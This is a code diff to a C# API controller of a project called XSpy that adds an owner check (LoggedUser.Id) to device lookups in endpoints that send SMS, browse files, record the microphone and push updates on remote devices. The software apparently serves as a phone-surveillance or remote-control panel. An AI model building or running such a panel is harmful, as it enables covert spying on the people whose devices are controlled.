@@ -29,7 +29,7 @@ namespace XSpy.Controllers.Api
         [HttpPost("{deviceId}/sms"), PreExecution]
         public async Task<IActionResult> SendSms([FromRoute] Guid deviceId, [FromBody] SendSmsRequest request)
         {
-            var device = await _deviceService.GetDeviceById(deviceId);
+            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
             if (device == null)
                 return NotFound();
             
@@ -50,7 +50,7 @@ namespace XSpy.Controllers.Api
         [HttpGet("{deviceId}/isLoading"), PreExecution]
         public async Task<IActionResult> IsDirLoaded(Guid deviceId)
         {
-            var device = await _deviceService.GetDeviceById(deviceId);
+            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
             if (device == null)
                 return NotFound();
 
@@ -70,7 +70,7 @@ namespace XSpy.Controllers.Api
         [HttpPost("{deviceId}/dir"), PreExecution]
         public async Task<IActionResult> LoadDir([FromRoute] Guid deviceId, LoadPathRequest pathRequest)
         {
-            var device = await _deviceService.GetDeviceById(deviceId);
+            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
             if (device == null || string.IsNullOrEmpty(device.DeviceId))
                 return NotFound();
 
@@ -94,7 +94,7 @@ namespace XSpy.Controllers.Api
         [HttpPost("{deviceId}/rec"), PreExecution]
         public async Task<IActionResult> Record([FromRoute] Guid deviceId, MicRecordRequest recordRequest)
         {
-            var device = await _deviceService.GetDeviceById(deviceId);
+            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
             if (device == null || string.IsNullOrEmpty(device.DeviceId))
                 return NotFound();
 
@@ -119,7 +119,7 @@ namespace XSpy.Controllers.Api
         [HttpGet("{deviceId}/update"), PreExecution]
         public async Task<IActionResult> RequestUpdate(Guid deviceId)
         {
-            var device = await _deviceService.GetDeviceById(deviceId);
+            var device = await _deviceService.GetDeviceById(deviceId, LoggedUser.Id);
             if (device == null || string.IsNullOrEmpty(device.DeviceId))
                 return NotFound();
 
